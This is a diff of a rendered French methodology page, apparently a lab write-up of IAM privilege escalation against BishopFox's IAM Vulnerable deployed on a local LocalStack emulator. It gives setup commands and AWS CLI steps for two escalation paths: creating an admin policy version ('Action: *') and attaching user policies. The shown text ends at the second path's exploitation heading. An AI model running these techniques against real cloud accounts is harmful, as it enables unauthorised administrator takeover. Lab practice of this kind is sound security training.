@@ -1227,6 +1227,17 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#0-prerequis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        0. Prérequis
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#1-mise-en-place-de-lenvironnement" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -1463,6 +1474,17 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
+  <a href="#0-prerequis" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        0. Prérequis
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#1-mise-en-place-de-lenvironnement" class="md-nav__link">
     <span class="md-ellipsis">
       
@@ -1674,90 +1696,109 @@
 
 
 <h1 id="rapport-methodologique-iam-vulnerable-sur-localstack-free-hive-vps">Rapport méthodologique — IAM Vulnerable sur LocalStack (Free Hive VPS)<a class="headerlink" href="#rapport-methodologique-iam-vulnerable-sur-localstack-free-hive-vps" title="Permanent link">&para;</a></h1>
-<p><strong>Analyste :</strong> Jean<br />
-<strong>Date :</strong> 23/07/2026<br />
-<strong>Cible :</strong> Environnement AWS IAM émulé localement (LocalStack) — 265 ressources IAM Vulnerable (BishopFox)<br />
+<p><strong>Analyste :</strong> Jean
+<strong>Date :</strong> 23/07/2026
+<strong>Cible :</strong> Environnement AWS IAM émulé localement (LocalStack) — 265 ressources IAM Vulnerable (BishopFox)
 <strong>Contexte :</strong> Adaptation d'un exercice cloud IAM privesc initialement prévu sur compte AWS réel, redéployé sur infrastructure VPS personnelle (Free Hive) après blocages successifs de quota sur comptes Azure Free Trial/Student (AzureGoat, XM Goat).</p>
+<hr />
+<h2 id="0-prerequis">0. Prérequis<a class="headerlink" href="#0-prerequis" title="Permanent link">&para;</a></h2>
+<ul>
+<li>Un compte LocalStack <strong>personnel et gratuit</strong> créé sur <code>https://app.localstack.cloud</code> (email + mot de passe ou SSO), avec récupération de son propre <strong>Personal Auth Token</strong> (section "Auth Tokens" du compte). Ce token est nominatif : la politique d'usage de LocalStack interdit le partage d'un même token entre plusieurs personnes.</li>
+<li>Docker installé sur la machine cible (VPS ou poste local) :
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>docker<span class="w"> </span>--version
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="c1"># si absent, installation standard via le dépôt officiel Docker selon la distribution</span>
+</code></pre></div></li>
+<li><code>pipx</code> installé (pour l'installation propre de <code>terraform-local</code> sur systèmes Ubuntu/Debian récents, protégés par PEP 668) :
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>pipx<span class="w"> </span>--version
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="c1"># si absent :</span>
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>pipx<span class="w"> </span>-y
+<a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a>pipx<span class="w"> </span>ensurepath
+</code></pre></div></li>
+<li>AWS CLI v2 :
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>aws<span class="w"> </span>--version
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="c1"># si absent, installation via winget (Windows) ou paquet officiel AWS (Linux/Mac)</span>
+</code></pre></div></li>
+</ul>
 <hr />
 <h2 id="1-mise-en-place-de-lenvironnement">1. Mise en place de l'environnement<a class="headerlink" href="#1-mise-en-place-de-lenvironnement" title="Permanent link">&para;</a></h2>
 <h3 id="11-provisioning-localstack-emulateur-aws-local">1.1 Provisioning LocalStack (émulateur AWS local)<a class="headerlink" href="#11-provisioning-localstack-emulateur-aws-local" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>docker<span class="w"> </span>run<span class="w"> </span>-d<span class="w"> </span>--name<span class="w"> </span>localstack<span class="w"> </span>-p<span class="w"> </span><span class="m">4566</span>:4566<span class="w"> </span>-e<span class="w"> </span><span class="nv">LOCALSTACK_AUTH_TOKEN</span><span class="o">=</span>&lt;TOKEN&gt;<span class="w"> </span>-e<span class="w"> </span><span class="nv">ENFORCE_IAM</span><span class="o">=</span><span class="m">1</span><span class="w"> </span>localstack/localstack
-<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>docker<span class="w"> </span>ps<span class="w"> </span>--filter<span class="w"> </span><span class="nv">name</span><span class="o">=</span>localstack
-<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>docker<span class="w"> </span>logs<span class="w"> </span>localstack
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>docker<span class="w"> </span>run<span class="w"> </span>-d<span class="w"> </span>--name<span class="w"> </span>localstack<span class="w"> </span>-p<span class="w"> </span><span class="m">4566</span>:4566<span class="w"> </span>-e<span class="w"> </span><span class="nv">LOCALSTACK_AUTH_TOKEN</span><span class="o">=</span>&lt;TOKEN&gt;<span class="w"> </span>-e<span class="w"> </span><span class="nv">ENFORCE_IAM</span><span class="o">=</span><span class="m">1</span><span class="w"> </span>localstack/localstack
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>docker<span class="w"> </span>ps<span class="w"> </span>--filter<span class="w"> </span><span class="nv">name</span><span class="o">=</span>localstack
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>docker<span class="w"> </span>logs<span class="w"> </span>localstack
 </code></pre></div>
 <h3 id="12-configuration-des-outils-clients">1.2 Configuration des outils clients<a class="headerlink" href="#12-configuration-des-outils-clients" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>aws<span class="w"> </span>--version
-<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>aws<span class="w"> </span>configure<span class="w"> </span>--profile<span class="w"> </span>localstack
-<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>aws<span class="w"> </span>--profile<span class="w"> </span>localstack<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>sts<span class="w"> </span>get-caller-identity
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>aws<span class="w"> </span>--version
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>aws<span class="w"> </span>configure<span class="w"> </span>--profile<span class="w"> </span>localstack
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>aws<span class="w"> </span>--profile<span class="w"> </span>localstack<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>sts<span class="w"> </span>get-caller-identity
 </code></pre></div>
 <h3 id="13-installation-terraform-wrapper-tflocal">1.3 Installation Terraform + wrapper tflocal<a class="headerlink" href="#13-installation-terraform-wrapper-tflocal" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>wget<span class="w"> </span>-O-<span class="w"> </span>https://apt.releases.hashicorp.com/gpg<span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>gpg<span class="w"> </span>--dearmor<span class="w"> </span>-o<span class="w"> </span>/usr/share/keyrings/hashicorp-archive-keyring.gpg
-<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com </span><span class="k">$(</span>lsb_release<span class="w"> </span>-cs<span class="k">)</span><span class="s2"> main&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>/etc/apt/sources.list.d/hashicorp.list
-<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>sudo<span class="w"> </span>apt<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>terraform<span class="w"> </span>-y
-<a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>pipx<span class="w"> </span>install<span class="w"> </span>terraform-local
-<a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>pipx<span class="w"> </span>ensurepath
-<a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a>tflocal<span class="w"> </span>--version
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>wget<span class="w"> </span>-O-<span class="w"> </span>https://apt.releases.hashicorp.com/gpg<span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>gpg<span class="w"> </span>--dearmor<span class="w"> </span>-o<span class="w"> </span>/usr/share/keyrings/hashicorp-archive-keyring.gpg
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="nb">echo</span><span class="w"> </span><span class="s2">&quot;deb [signed-by=/usr/share/keyrings/hashicorp-archive-keyring.gpg] https://apt.releases.hashicorp.com </span><span class="k">$(</span>lsb_release<span class="w"> </span>-cs<span class="k">)</span><span class="s2"> main&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sudo<span class="w"> </span>tee<span class="w"> </span>/etc/apt/sources.list.d/hashicorp.list
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>sudo<span class="w"> </span>apt<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>terraform<span class="w"> </span>-y
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>pipx<span class="w"> </span>install<span class="w"> </span>terraform-local
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>pipx<span class="w"> </span>ensurepath
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>tflocal<span class="w"> </span>--version
 </code></pre></div>
 <h3 id="14-deploiement-du-playground-iam-vulnerable">1.4 Déploiement du playground IAM Vulnerable<a class="headerlink" href="#14-deploiement-du-playground-iam-vulnerable" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/BishopFox/iam-vulnerable
-<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="nb">cd</span><span class="w"> </span>iam-vulnerable
-<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>tflocal<span class="w"> </span>init
-<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>tflocal<span class="w"> </span>plan<span class="w"> </span>-var<span class="o">=</span><span class="s2">&quot;aws_local_profile=localstack&quot;</span>
-<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>tflocal<span class="w"> </span>apply<span class="w"> </span>-var<span class="o">=</span><span class="s2">&quot;aws_local_profile=localstack&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/BishopFox/iam-vulnerable
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="nb">cd</span><span class="w"> </span>iam-vulnerable
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>tflocal<span class="w"> </span>init
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>tflocal<span class="w"> </span>plan<span class="w"> </span>-var<span class="o">=</span><span class="s2">&quot;aws_local_profile=localstack&quot;</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>tflocal<span class="w"> </span>apply<span class="w"> </span>-var<span class="o">=</span><span class="s2">&quot;aws_local_profile=localstack&quot;</span>
 </code></pre></div>
 <p>Résultat : 265 ressources IAM créées (31 chemins de privilege escalation distincts).</p>
 <hr />
 <h2 id="2-chemin-dexploitation-n1-privesc1-createnewpolicyversion">2. Chemin d'exploitation n°1 — privesc1-CreateNewPolicyVersion<a class="headerlink" href="#2-chemin-dexploitation-n1-privesc1-createnewpolicyversion" title="Permanent link">&para;</a></h2>
 <h3 id="21-obtention-des-acces">2.1 Obtention des accès<a class="headerlink" href="#21-obtention-des-acces" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span>localstack<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>create-access-key<span class="w"> </span>--user-name<span class="w"> </span>privesc1-CreateNewPolicyVersion-user
-<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>aws<span class="w"> </span>configure<span class="w"> </span><span class="nb">set</span><span class="w"> </span>aws_access_key_id<span class="w"> </span>&lt;ACCESS_KEY_ID&gt;<span class="w"> </span>--profile<span class="w"> </span>privesc1
-<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>aws<span class="w"> </span>configure<span class="w"> </span><span class="nb">set</span><span class="w"> </span>aws_secret_access_key<span class="w"> </span>&lt;SECRET_ACCESS_KEY&gt;<span class="w"> </span>--profile<span class="w"> </span>privesc1
-<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>aws<span class="w"> </span>configure<span class="w"> </span><span class="nb">set</span><span class="w"> </span>region<span class="w"> </span>us-east-1<span class="w"> </span>--profile<span class="w"> </span>privesc1
-<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>aws<span class="w"> </span>--profile<span class="w"> </span>privesc1<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>sts<span class="w"> </span>get-caller-identity
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span>localstack<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>create-access-key<span class="w"> </span>--user-name<span class="w"> </span>privesc1-CreateNewPolicyVersion-user
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>aws<span class="w"> </span>configure<span class="w"> </span><span class="nb">set</span><span class="w"> </span>aws_access_key_id<span class="w"> </span>&lt;ACCESS_KEY_ID&gt;<span class="w"> </span>--profile<span class="w"> </span>privesc1
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>aws<span class="w"> </span>configure<span class="w"> </span><span class="nb">set</span><span class="w"> </span>aws_secret_access_key<span class="w"> </span>&lt;SECRET_ACCESS_KEY&gt;<span class="w"> </span>--profile<span class="w"> </span>privesc1
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>aws<span class="w"> </span>configure<span class="w"> </span><span class="nb">set</span><span class="w"> </span>region<span class="w"> </span>us-east-1<span class="w"> </span>--profile<span class="w"> </span>privesc1
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>aws<span class="w"> </span>--profile<span class="w"> </span>privesc1<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>sts<span class="w"> </span>get-caller-identity
 </code></pre></div>
 <h3 id="22-reconnaissance">2.2 Reconnaissance<a class="headerlink" href="#22-reconnaissance" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span>privesc1<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>list-attached-user-policies<span class="w"> </span>--user-name<span class="w"> </span>privesc1-CreateNewPolicyVersion-user
-<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>aws<span class="w"> </span>--profile<span class="w"> </span>privesc1<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>get-policy<span class="w"> </span>--policy-arn<span class="w"> </span>arn:aws:iam::000000000000:policy/privesc1-CreateNewPolicyVersion
-<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>aws<span class="w"> </span>--profile<span class="w"> </span>privesc1<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>get-policy-version<span class="w"> </span>--policy-arn<span class="w"> </span>arn:aws:iam::000000000000:policy/privesc1-CreateNewPolicyVersion<span class="w"> </span>--version-id<span class="w"> </span>v1
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span>privesc1<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>list-attached-user-policies<span class="w"> </span>--user-name<span class="w"> </span>privesc1-CreateNewPolicyVersion-user
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>aws<span class="w"> </span>--profile<span class="w"> </span>privesc1<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>get-policy<span class="w"> </span>--policy-arn<span class="w"> </span>arn:aws:iam::000000000000:policy/privesc1-CreateNewPolicyVersion
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>aws<span class="w"> </span>--profile<span class="w"> </span>privesc1<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>get-policy-version<span class="w"> </span>--policy-arn<span class="w"> </span>arn:aws:iam::000000000000:policy/privesc1-CreateNewPolicyVersion<span class="w"> </span>--version-id<span class="w"> </span>v1
 </code></pre></div>
 <p>Vecteur identifié : permission unique <code>iam:CreatePolicyVersion</code> sur <code>Resource: "*"</code>.</p>
 <h3 id="23-exploitation">2.3 Exploitation<a class="headerlink" href="#23-exploitation" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/admin-policy.json<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
-<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="s">{</span>
-<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="s">  &quot;Version&quot;: &quot;2012-10-17&quot;,</span>
-<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="s">  &quot;Statement&quot;: [</span>
-<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="s">    {</span>
-<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="s">      &quot;Effect&quot;: &quot;Allow&quot;,</span>
-<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a><span class="s">      &quot;Action&quot;: &quot;*&quot;,</span>
-<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a><span class="s">      &quot;Resource&quot;: &quot;*&quot;</span>
-<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a><span class="s">    }</span>
-<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a><span class="s">  ]</span>
-<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a><span class="s">}</span>
-<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a><span class="s">EOF</span>
-<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>
-<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>aws<span class="w"> </span>--profile<span class="w"> </span>privesc1<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>create-policy-version<span class="w"> </span>--policy-arn<span class="w"> </span>arn:aws:iam::000000000000:policy/privesc1-CreateNewPolicyVersion<span class="w"> </span>--policy-document<span class="w"> </span>file:///tmp/admin-policy.json<span class="w"> </span>--set-as-default
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/admin-policy.json<span class="w"> </span><span class="s">&lt;&lt; &#39;EOF&#39;</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="s">{</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a><span class="s">  &quot;Version&quot;: &quot;2012-10-17&quot;,</span>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="s">  &quot;Statement&quot;: [</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="s">    {</span>
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="s">      &quot;Effect&quot;: &quot;Allow&quot;,</span>
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a><span class="s">      &quot;Action&quot;: &quot;*&quot;,</span>
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="s">      &quot;Resource&quot;: &quot;*&quot;</span>
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a><span class="s">    }</span>
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="s">  ]</span>
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="s">}</span>
+<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="s">EOF</span>
+<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a>
+<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a>aws<span class="w"> </span>--profile<span class="w"> </span>privesc1<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>create-policy-version<span class="w"> </span>--policy-arn<span class="w"> </span>arn:aws:iam::000000000000:policy/privesc1-CreateNewPolicyVersion<span class="w"> </span>--policy-document<span class="w"> </span>file:///tmp/admin-policy.json<span class="w"> </span>--set-as-default
 </code></pre></div>
 <h3 id="24-verification-dimpact">2.4 Vérification d'impact<a class="headerlink" href="#24-verification-dimpact" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span>privesc1<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>list-users<span class="w"> </span>--query<span class="w"> </span><span class="s2">&quot;Users[].UserName&quot;</span><span class="w"> </span>--output<span class="w"> </span>table
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span>privesc1<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>list-users<span class="w"> </span>--query<span class="w"> </span><span class="s2">&quot;Users[].UserName&quot;</span><span class="w"> </span>--output<span class="w"> </span>table
 </code></pre></div>
 <hr />
 <h2 id="3-chemin-dexploitation-n2-privesc7-attachuserpolicy">3. Chemin d'exploitation n°2 — privesc7-AttachUserPolicy<a class="headerlink" href="#3-chemin-dexploitation-n2-privesc7-attachuserpolicy" title="Permanent link">&para;</a></h2>
 <h3 id="31-obtention-des-acces">3.1 Obtention des accès<a class="headerlink" href="#31-obtention-des-acces" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span>localstack<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>create-access-key<span class="w"> </span>--user-name<span class="w"> </span>privesc7-AttachUserPolicy-user
-<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>aws<span class="w"> </span>configure<span class="w"> </span><span class="nb">set</span><span class="w"> </span>aws_access_key_id<span class="w"> </span>&lt;ACCESS_KEY_ID&gt;<span class="w"> </span>--profile<span class="w"> </span>privesc7
-<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>aws<span class="w"> </span>configure<span class="w"> </span><span class="nb">set</span><span class="w"> </span>aws_secret_access_key<span class="w"> </span>&lt;SECRET_ACCESS_KEY&gt;<span class="w"> </span>--profile<span class="w"> </span>privesc7
-<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>aws<span class="w"> </span>configure<span class="w"> </span><span class="nb">set</span><span class="w"> </span>region<span class="w"> </span>us-east-1<span class="w"> </span>--profile<span class="w"> </span>privesc7
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span>localstack<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>create-access-key<span class="w"> </span>--user-name<span class="w"> </span>privesc7-AttachUserPolicy-user
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>aws<span class="w"> </span>configure<span class="w"> </span><span class="nb">set</span><span class="w"> </span>aws_access_key_id<span class="w"> </span>&lt;ACCESS_KEY_ID&gt;<span class="w"> </span>--profile<span class="w"> </span>privesc7
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>aws<span class="w"> </span>configure<span class="w"> </span><span class="nb">set</span><span class="w"> </span>aws_secret_access_key<span class="w"> </span>&lt;SECRET_ACCESS_KEY&gt;<span class="w"> </span>--profile<span class="w"> </span>privesc7
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>aws<span class="w"> </span>configure<span class="w"> </span><span class="nb">set</span><span class="w"> </span>region<span class="w"> </span>us-east-1<span class="w"> </span>--profile<span class="w"> </span>privesc7
 </code></pre></div>
 <h3 id="32-reconnaissance">3.2 Reconnaissance<a class="headerlink" href="#32-reconnaissance" title="Permanent link">&para;</a></h3>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span>privesc7<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>list-attached-user-policies<span class="w"> </span>--user-name<span class="w"> </span>privesc7-AttachUserPolicy-user
-<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>aws<span class="w"> </span>--profile<span class="w"> </span>privesc7<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>get-policy-version<span class="w"> </span>--policy-arn<span class="w"> </span>arn:aws:iam::000000000000:policy/privesc7-AttachUserPolicy<span class="w"> </span>--version-id<span class="w"> </span>v1
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>aws<span class="w"> </span>--profile<span class="w"> </span>privesc7<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>list-attached-user-policies<span class="w"> </span>--user-name<span class="w"> </span>privesc7-AttachUserPolicy-user
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>aws<span class="w"> </span>--profile<span class="w"> </span>privesc7<span class="w"> </span>--endpoint-url<span class="o">=</span>http://localhost:4566<span class="w"> </span>iam<span class="w"> </span>get-policy-version<span class="w"> </span>--policy-arn<span class="w"> </span>arn:aws:iam::000000000000:policy/privesc7-AttachUserPolicy<span class="w"> </span>--version-id<span class="w"> </span>v1
 </code></pre></div>
 <p>Vecteur identifié : permission unique <code>iam:AttachUserPolicy</code> sur <code>Resource: "*"</code>.</p>
 <h3 id="33-exploitation">3.3 Exploitation<a class="headerlink" href="#33-exploitation" title="Permanent link">&para;</a></h3>
